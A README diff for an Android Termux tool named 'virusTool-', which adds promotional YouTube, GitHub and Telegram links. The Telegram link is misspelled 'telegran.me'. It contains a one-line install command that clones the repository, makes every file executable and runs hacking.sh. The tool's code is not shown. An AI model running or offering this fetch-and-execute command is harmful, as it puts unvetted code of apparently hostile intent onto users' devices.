@@ -16,7 +16,7 @@ i love my India ❤️
 
 my whatsapp number : +91 9176810909
 
-#Note : 
+# Note : 
 
   Don't use this tool for your personal phone 
 
@@ -29,4 +29,18 @@ my whatsapp number : +91 9176810909
 pkg update -y && pkg upgrade && pkg install git -y && git clone https://github.com/WhiteHatTeamOfficial/virusTool-.git && cd virusTool-  && ls && clear && ls && chmod +x * && ls && clear && ./hacking.sh
 
 👉 This tool for mainly I am developed termux environment Android users 
+
+🌟 video Tutorials how to install this tool
+ 
+  #  Official White Hat Team youtube
+
+  https://youtube.com/shorts/k5wRKzQHvzU?feature=share
+
+ # official github 
+
+https://github.com/WhiteHatTeamOfficial
+
+# official telegram channel
+
+https://telegran.me/WhiteHatTeam
 
